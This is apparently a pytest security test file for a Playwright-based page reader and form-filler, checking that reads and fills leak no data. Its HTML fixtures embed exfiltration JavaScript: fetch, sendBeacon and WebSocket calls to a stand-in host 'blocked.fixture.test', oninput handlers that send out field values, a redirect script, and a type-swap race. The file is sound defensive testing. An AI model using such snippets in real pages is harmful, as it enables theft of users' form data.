"""Security closure asserts absence of effects, not successful exploit completion."""
from contextlib import contextmanager
from types import SimpleNamespace
import json
import pytest
from database.store import Store
from browser.playwright_reader import PlaywrightReader,BrowserReadConfig,BrowserReadError
from browser.site_access import SiteAccess
from worker.application_executor import ApplicationExecutor

GOOD='https://approved.fixture.test'
BAD='https://blocked.fixture.test'


@contextmanager
def lab(monkeypatch,html,*,after=None,responses=None):
    import playwright.sync_api as api
    real=api.sync_playwright;traffic=[];observed=[];launches=[]
    class Factory:
        def __enter__(self):
            self.cm=real();p=self.cm.__enter__()
            def launch(**kwargs):
                launches.append(kwargs)
                browser=p.chromium.launch(**kwargs);create=browser.new_context;close=browser.close;pages=[]
                def new_context(**options):
                    assert options['service_workers']=='block'
                    ctx=create(**options)
                    def sink(route):
                        traffic.append((route.request.url,route.request.method,route.request.post_data))
                        if responses and route.request.url in responses:
                            route.fulfill(**responses[route.request.url]);return
                        route.fulfill(status=200,content_type='text/html',body=html)
                    ctx.route('**/*',sink);new_page=ctx.new_page
                    def page():
                        pg=new_page();pages.append(pg);goto=pg.goto
                        def visit(*args,**kw):
                            result=goto(*args,**kw);pg.wait_for_timeout(200)
                            if after:after(pg,ctx)
                            return result
                        pg.goto=visit;return pg
                    ctx.new_page=page;return ctx
                browser.new_context=new_context
                def finish():
                    for pg in pages:
                        if not pg.is_closed():
                            observed.extend(pg.locator('input').evaluate_all('els=>els.map(e=>({type:e.type,value:e.value}))'))
                    close()
                browser.close=finish;return browser
            return SimpleNamespace(chromium=SimpleNamespace(launch=launch))
        def __exit__(self,*args):return self.cm.__exit__(*args)
    monkeypatch.setattr(api,'sync_playwright',Factory)
    yield traffic,observed,launches


@pytest.mark.parametrize('managed',[False,True])
def test_all_reader_paths_block_writes_offsite_resources_and_websockets(tmp_path,monkeypatch,caplog,managed):
    store=Store(tmp_path/'db');access=SiteAccess(store)
    access.add(GOOD);access.change('approved.fixture.test','public')
    html='''<body>Approved content<img src="https://blocked.fixture.test/pixel?private=synthetic-canary">
    <script>
    for(const method of ['POST','PUT','DELETE'])fetch('https://blocked.fixture.test/collect',{method,mode:'no-cors',body:'synthetic-canary'}).catch(()=>{});
    fetch('/write',{method:'POST',body:'synthetic-canary'}).catch(()=>{});
    navigator.sendBeacon('https://blocked.fixture.test/beacon','synthetic-canary');
    new WebSocket('wss://blocked.fixture.test/ws');
    navigator.serviceWorker.register('/sw.js').catch(()=>{});
    </script></body>'''
    monkeypatch.setenv('GROQ_API_KEY','synthetic-provider-environment-canary')
    reader=PlaywrightReader(BrowserReadConfig(allowed_domains=('approved.fixture.test',)),access=access if managed else None,domain='approved.fixture.test' if managed else None)
    def restricted_apis(page,context):
        assert page.evaluate("['RTCPeerConnection','WebTransport','Worker','SharedWorker'].every(n=>window[n]===undefined)")
    with lab(monkeypatch,html,after=restricted_apis) as (traffic,observed,launches):
        listing=reader.read_url(GOOD+'/read')
    assert 'Approved content' in listing.payload['text']
    assert traffic==[(GOOD+'/read','GET',None)]
    assert 'synthetic-provider-environment-canary' not in json.dumps(launches)
    if managed:
        with store._connect() as con:events=[dict(r) for r in con.execute("SELECT * FROM audit_log WHERE category='security'")]
        assert events and 'synthetic-canary' not in json.dumps(events)
    else:assert 'Browser request blocked' in caplog.text and 'synthetic-canary' not in caplog.text


def test_explicit_resource_origin_allows_only_safe_subresources(monkeypatch):
    html='<body>Approved<img src="https://blocked.fixture.test/pixel"></body>'
    config=BrowserReadConfig(allowed_domains=('approved.fixture.test',),resource_origins=(BAD,))
    with lab(monkeypatch,html) as (traffic,_,__):
        PlaywrightReader(config).read_url(GOOD+'/read')
    assert (BAD+'/pixel','GET',None) in traffic


@pytest.mark.parametrize('html',[
    '<input id="target" type="password">',
    '<input id="target" type="hidden">',
    '<input id="target" style="display:none">',
    '<input id="target"><input id="target">',
    '<label for="target">Password</label><input id="target">',
    '<input id="target" autocomplete="current-password">',
    '<form action="https://blocked.fixture.test/collect"><input id="target"></form>',
    '<script>location.replace("https://blocked.fixture.test/form")</script><input id="target">',
])
def test_actual_dom_or_navigation_blocks_before_any_value(tmp_path,monkeypatch,html):
    store,fields=form_fixture(tmp_path)
    with lab(monkeypatch,html) as (traffic,observed,_):
        result=ApplicationExecutor(store).prepare(GOOD+'/form',fields,approved=True)
    assert result['status']=='BLOCKED'
    assert all(not field['value'] for field in observed)
    assert not any(url.startswith(BAD) for url,_,__ in traffic)


def form_fixture(tmp_path):
    store=Store(tmp_path/'form.db')
    store.add_source({'id':'fixture','name':'Fixture','url':GOOD,'protocol':'HTTPS','verification_status':'APPROVED'})
    fact=store.add_candidate_fact({'text':'Name: Synthetic Person','status':'USER_CONFIRMED'})
    fields=[dict(selector='#target',label='Name',input_type='text',value='Synthetic Person',fact_id=fact)]
    return store,fields


def test_approved_fill_has_no_event_exfiltration_even_to_same_origin(tmp_path,monkeypatch):
    store,fields=form_fixture(tmp_path)
    html='''<label for="target">Name</label><input id="target" oninput="fetch('/collect?value='+this.value);navigator.sendBeacon('https://blocked.fixture.test/collect',this.value)">'''
    with lab(monkeypatch,html) as (traffic,observed,_):
        result=ApplicationExecutor(store).prepare(GOOD+'/form',fields,approved=True)
    assert result['status']=='FILLED' and observed[0]['value']=='Synthetic Person'
    assert traffic==[(GOOD+'/form','GET',None)]


def test_form_change_during_first_fill_never_fills_new_sensitive_field(tmp_path,monkeypatch):
    store,fields=form_fixture(tmp_path)
    fields.append(dict(fields[0],selector='#second'))
    html='<input id="target" oninput="document.querySelector(\'#second\').type=\'password\'"><input id="second">'
    with lab(monkeypatch,html) as (_,observed,__):
        result=ApplicationExecutor(store).prepare(GOOD+'/form',fields,approved=True)
    assert result['status']=='BLOCKED' and observed[1]['type']=='password' and observed[1]['value']==''


def test_reader_refuses_http_redirect_to_unapproved_origin(monkeypatch):
    responses={GOOD+'/read':dict(status=302,headers={'Location':BAD+'/destination'},body='')}
    with lab(monkeypatch,'<body>Fixture</body>',responses=responses) as (traffic,_,__):
        with pytest.raises(BrowserReadError):PlaywrightReader(BrowserReadConfig(allowed_domains=('approved.fixture.test',))).read_url(GOOD+'/read')
    assert not any(url.startswith(BAD) for url,_,__ in traffic)


def test_type_change_at_write_boundary_cannot_receive_private_value(tmp_path,monkeypatch):
    from playwright.sync_api import ElementHandle
    original=ElementHandle.evaluate
    def race(node,expression,arg=None):
        if expression=='(node,p)=>window[p.name](node,p)':
            original(node,"e=>e.type='password'")
        return original(node,expression,arg)
    monkeypatch.setattr(ElementHandle,'evaluate',race)
    store,fields=form_fixture(tmp_path)
    with lab(monkeypatch,'<input id="target">') as (_,observed,__):
        result=ApplicationExecutor(store).prepare(GOOD+'/form',fields,approved=True)
    assert result['status']=='BLOCKED'
    assert observed==[{'type':'password','value':''}]
